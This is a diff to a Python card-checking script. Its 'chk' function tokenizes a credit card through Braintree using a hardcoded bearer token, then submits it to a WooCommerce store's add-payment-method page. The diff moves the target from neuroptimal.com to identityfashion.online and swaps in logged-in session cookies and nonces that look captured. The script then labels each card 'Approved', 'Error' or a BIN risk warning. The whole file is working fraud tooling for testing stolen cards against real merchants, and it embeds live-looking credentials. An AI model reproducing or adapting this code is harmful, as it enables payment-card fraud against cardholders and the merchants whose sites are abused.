@@ -85,12 +85,11 @@ def chk(card):
 
 
 
-
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ1MjA4MjUsImp0aSI6IjA4NTBmYTYzLTQzMTgtNDhlZS1hYjkyLTM1MDcyNWJjY2VlMyIsInN1YiI6InhmazY4OGgya2J4cmRmaHIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InhmazY4OGgya2J4cmRmaHIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.736ttbtpkje95eOQfxXSLrPkqZOx_IB5LjuGHmTDNB2Log985mroQewlPyx1cnz91glkpvCuS7oPai3-sI6K-g',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ4OTIxNzMsImp0aSI6IjE4OWQ2MTRmLTAyNmQtNDgxNS04ZGU5LWMyYWExMjYzY2YyMiIsInN1YiI6InF5anJxNDR6Y2Q2czMyOWoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF5anJxNDR6Y2Q2czMyOWoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.YZ4oXeD97v5eJWsjxvbLw7rdKr549P59Q54VZ6Ew3X_z432wRGM3ga6sHSM2diNzwWBHivvWb7u9MkbcMaZ_qw',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -110,7 +109,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '2be027c1-dd0c-4961-bd73-b71dfde158a5',
+        'sessionId': '9a814398-d870-4db6-aac8-09c8ae2337f0',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -130,41 +129,39 @@ def chk(card):
 }
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
 	tok = response.json()['data']['tokenizeCreditCard']['token']
-#2
 
-
-
+#4
 
 	cookies = {
-    'cmplz_consent_mode': 'security_storage,functionality_storage,personalization_storage,analytics_storage,ad_storage,ad_user_data,ad_personalization',
-    'cmplz_consented_services': '',
-    'cmplz_policy_id': '38',
-    'cmplz_marketing': 'allow',
-    'cmplz_statistics': 'allow',
-    'cmplz_preferences': 'allow',
-    'cmplz_functional': 'allow',
-    '_gcl_au': '1.1.96077920.1733932939',
-    '_ga': 'GA1.1.1994752063.1733932940',
-    'PHPSESSID': '8119e7c4edc4b125784d5144904c4e0e',
-    'wordpress_test_cookie': 'WP%20Cookie%20check',
-    '_fbp': 'fb.1.1734434242223.686302641403762484',
-    'zengar_country': 'usa',
-    'wordpress_logged_in_5fd67a3eda9b0a8c6e760c19fdac9623': 'moh5527vbnm%7C1735643894%7CojkTzSSONuNv64yy9b2P0UjENrqAxGyi9uJFhJuEZ3q%7C3137be513c781902615013a4d088434ab38256a65efe8adacd3c67798fb68792',
-    'wfwaf-authcookie-fd8d352bf81fdfa7c2f667c58341381a': '15241%7Cother%7Cread%7C5d202d0874787ea8f0c9502b5635f50f4b7083af6f4ac8826d1eeb61805df0f9',
-    '_ga_BE2RBLDMMZ': 'GS1.1.1734434241.2.1.1734434422.0.0.0',
+    '_ga': 'GA1.1.1015169626.1733746575',
+    'cookie_notice_accepted': 'true',
+    'wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4': 'bbxbcbb.hhxbfbb-5641%7C1735398219%7CYhAGlC7QQWdRAOjHEUBrwgXQirCsdbV0TSID7mEZu2y%7Ce7d210b2843350fbf65e68a2fa38fc66d8d152794002518fb248ea291199d687',
+    'wp_woocommerce_session_01ab3e4e3f8942e1c1b51e73f4fe9bf4': '162%7C%7C1734966100%7C%7C1734962500%7C%7Cd6f69041f5dfd6175977b9a5aecc5449',
+    'wfwaf-authcookie-8c84895040128b898589b5670ddc8148': '162%7Cother%7Cread%7C6e822796ca100f2f11639fe737887f3cff44c9cd359681ebaeefe058da203913',
+    'woocommerce_items_in_cart': '1',
+    'woocommerce_cart_hash': 'fa607743e2ceb4617ba4278dc72a2064',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_first_add': 'fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_50RCK7EFBE': 'GS1.1.1734805383.10.1.1734805771.0.0.0',
 }
 
 	headers = {
-    'authority': 'neuroptimal.com',
+    'authority': 'identityfashion.online',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'cmplz_consent_mode=security_storage,functionality_storage,personalization_storage,analytics_storage,ad_storage,ad_user_data,ad_personalization; cmplz_consented_services=; cmplz_policy_id=38; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; _gcl_au=1.1.96077920.1733932939; _ga=GA1.1.1994752063.1733932940; PHPSESSID=8119e7c4edc4b125784d5144904c4e0e; wordpress_test_cookie=WP%20Cookie%20check; _fbp=fb.1.1734434242223.686302641403762484; zengar_country=usa; wordpress_logged_in_5fd67a3eda9b0a8c6e760c19fdac9623=moh5527vbnm%7C1735643894%7CojkTzSSONuNv64yy9b2P0UjENrqAxGyi9uJFhJuEZ3q%7C3137be513c781902615013a4d088434ab38256a65efe8adacd3c67798fb68792; wfwaf-authcookie-fd8d352bf81fdfa7c2f667c58341381a=15241%7Cother%7Cread%7C5d202d0874787ea8f0c9502b5635f50f4b7083af6f4ac8826d1eeb61805df0f9; _ga_BE2RBLDMMZ=GS1.1.1734434241.2.1.1734434422.0.0.0',
-    'origin': 'https://neuroptimal.com',
+    # 'cookie': '_ga=GA1.1.1015169626.1733746575; cookie_notice_accepted=true; wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4=bbxbcbb.hhxbfbb-5641%7C1735398219%7CYhAGlC7QQWdRAOjHEUBrwgXQirCsdbV0TSID7mEZu2y%7Ce7d210b2843350fbf65e68a2fa38fc66d8d152794002518fb248ea291199d687; wp_woocommerce_session_01ab3e4e3f8942e1c1b51e73f4fe9bf4=162%7C%7C1734966100%7C%7C1734962500%7C%7Cd6f69041f5dfd6175977b9a5aecc5449; wfwaf-authcookie-8c84895040128b898589b5670ddc8148=162%7Cother%7Cread%7C6e822796ca100f2f11639fe737887f3cff44c9cd359681ebaeefe058da203913; woocommerce_items_in_cart=1; woocommerce_cart_hash=fa607743e2ceb4617ba4278dc72a2064; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-12-21%2018%3A29%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; _ga_50RCK7EFBE=GS1.1.1734805383.10.1.1734805771.0.0.0',
+    'origin': 'https://identityfashion.online',
     'pragma': 'no-cache',
-    'referer': 'https://neuroptimal.com/my-account/add-payment-method/',
+    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -178,19 +175,24 @@ def chk(card):
 
 	data = {
     'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'visa',
+    'wc-braintree-credit-card-card-type': 'master-card',
     'wc-braintree-credit-card-3d-secure-enabled': '',
     'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '13.98',
+    'wc_braintree_credit_card_payment_nonce':tok,
+    'wc_braintree_device_data': '{"correlation_id":"aef16a868e86fc9b1c3acd7a2d2c92a2"}',
     'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': 'e0005af349',
+    'woocommerce-add-payment-method-nonce': '28cb6b5997',
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
 
-	response = requests.post('https://neuroptimal.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	response = requests.post(
+    'https://identityfashion.online/my-account/add-payment-method/',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+)
 
 	text = response.text
 	pattern = r'Status code (.*?)\s*</li>'
@@ -203,7 +205,7 @@ def chk(card):
 		if 'risk_threshold' in text:
 		    result = "RISK: Retry this BIN later."
 	else:
-		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+		if 'Nice! New payment method added' in text or 'authenticate_rejected' in text:
 			result = "1000: Approved"
 		else:
 			result = "Error"
